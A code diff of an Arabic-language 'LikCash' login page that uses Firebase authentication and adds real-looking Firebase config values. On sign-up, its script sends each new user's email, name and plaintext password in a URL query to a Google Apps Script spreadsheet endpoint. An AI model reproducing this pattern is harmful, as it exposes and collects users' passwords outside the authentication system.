@@ -32,22 +32,22 @@
 
     <div class="max-w-md w-full bg-white rounded-[3rem] p-10 shadow-2xl border border-slate-100 text-center">
         <img src="https://i.postimg.cc/zffZkRtk/31998-removebg-preview.png" alt="LikCash" class="h-12 mx-auto mb-8">
-        <h2 id="title" class="text-2xl text-slate-900 mb-6 italic text-blue-600">تسجيل الدخول</h2>
+        <h2 id="title" class="text-2xl text-slate-900 mb-6 italic text-blue-600 uppercase">تسجيل الدخول</h2>
 
         <form id="authForm" onsubmit="handleAction(event)" class="space-y-4 text-right">
             <div id="name-field" class="hidden space-y-1">
                 <label class="text-[10px] text-slate-400 mr-2 uppercase">الاسم الكامل</label>
-                <input type="text" id="userName" name="name" autocomplete="name" placeholder="الاسم الكامل" class="input-pro w-full px-5 py-4 rounded-2xl">
+                <input type="text" id="userName" placeholder="الاسم الكامل" class="input-pro w-full px-5 py-4 rounded-2xl">
             </div>
 
             <div class="space-y-1">
                 <label class="text-[10px] text-slate-400 mr-2 uppercase">البريد الالكتروني</label>
-                <input type="email" id="userEmail" name="email" autocomplete="username" placeholder="mail@example.com" class="input-pro w-full px-5 py-4 rounded-2xl text-left font-sans" required>
+                <input type="email" id="userEmail" autocomplete="username" placeholder="mail@example.com" class="input-pro w-full px-5 py-4 rounded-2xl text-left font-sans" required>
             </div>
 
             <div class="space-y-1">
                 <label class="text-[10px] text-slate-400 mr-2 uppercase">كلمة المرور</label>
-                <input type="password" id="userPass" name="password" autocomplete="current-password" placeholder="••••••••" class="input-pro w-full px-5 py-4 rounded-2xl text-left" required>
+                <input type="password" id="userPass" autocomplete="current-password" placeholder="••••••••" class="input-pro w-full px-5 py-4 rounded-2xl text-left" required>
             </div>
             
             <button type="submit" id="btn1" class="w-full bg-slate-900 text-white py-5 rounded-2xl text-lg flex items-center justify-center gap-3 hover:bg-blue-600 transition-all shadow-xl mt-4">
@@ -73,21 +73,23 @@
     </div>
 
     <script>
-        // الرابط الجديد الخاص بك
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxB7L2OTU6-eKo7uYKRA777_MJFmCWfun6aQiCQiWcN88sYKI14qbPxFV0EYg_6wZOkdg/exec";
-        
-        // ضع هنا إعدادات Firebase الخاصة بك
+        // إعدادات Firebase الحقيقية من الصورة
         const firebaseConfig = {
-          apiKey: "AIzaSy...", 
-          authDomain: "likcash-auth.firebaseapp.com",
-          projectId: "likcash-auth",
-          storageBucket: "likcash-auth.appspot.com",
-          messagingSenderId: "...",
-          appId: "..."
+            apiKey: "AIzaSyBP77A_0dc3Z1H6jrUmhtapLF1w0Gbe4B8",
+            authDomain: "likcash-auth.firebaseapp.com",
+            projectId: "likcash-auth",
+            storageBucket: "likcash-auth.firebasestorage.app",
+            messagingSenderId: "19126222896",
+            appId: "1:19126222896:web:0a6416948afa024e53adf5",
+            measurementId: "G-Q4Z0JB801H"
         };
 
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
+
+        // رابط Apps Script الجديد الخاص بك
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbymYJH8FS0h-6kT7acrG-XEdtC9SLCN0W2JnQDYEyutuGyum6hvbuOdquoDcKnPaFEF1Q/exec";
+        
         let mode = "login";
 
         function toggleSignUp() {
@@ -106,6 +108,7 @@
 
         function closeModal() { document.getElementById('customModal').classList.add('hidden'); }
 
+        // الدخول أو التسجيل العادي
         async function handleAction(event) {
             event.preventDefault();
             const email = document.getElementById('userEmail').value.trim();
@@ -120,19 +123,20 @@
                     await auth.signInWithEmailAndPassword(email, pass);
                 } else {
                     await auth.createUserWithEmailAndPassword(email, pass);
-                    // إرسال البيانات للجدول عند إنشاء حساب جديد فقط
+                    // حفظ البيانات في الجدول عند التسجيل الجديد
                     fetch(`${SCRIPT_URL}?action=saveData&email=${encodeURIComponent(email)}&name=${encodeURIComponent(name)}&pass=${encodeURIComponent(pass)}`);
                 }
                 sessionStorage.setItem('userEmail', email);
                 window.location.replace("w/check.html");
             } catch (error) {
-                showMsg("تنبيه", "تأكد من صحة البيانات أو وجود الحساب");
+                showMsg("تنبيه", "البريد أو كلمة المرور غير صحيحة");
             } finally {
                 document.getElementById('text1').classList.remove('hidden');
                 document.getElementById('load1').style.display = "none";
             }
         }
 
+        // الدخول بجوجل
         async function loginWithGoogle() {
             const provider = new firebase.auth.GoogleAuthProvider();
             try {
@@ -144,7 +148,7 @@
                 sessionStorage.setItem('userEmail', user.email);
                 window.location.replace("w/check.html");
             } catch (error) {
-                showMsg("خطأ", "فشل الاتصال بجوجل");
+                showMsg("خطأ", "فشل الاتصال بجوجل. تأكد من تفعيل نطاق الموقع في Firebase");
             }
         }
     </script>
